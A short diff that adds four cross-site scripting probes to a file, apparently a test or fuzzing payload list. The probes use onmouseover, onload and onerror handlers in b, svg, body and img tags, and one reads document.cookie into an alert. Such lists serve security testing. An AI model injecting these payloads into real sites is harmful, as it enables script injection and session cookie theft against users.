@@ -1,0 +1,4 @@
+<b onmouseover=alert("xss")>Click Me!</b>
+<svg onload=alert(1)>
+<body onload="alert('xss')">
+<img src="http://site.com/"onerror=alert(document.cookie);>
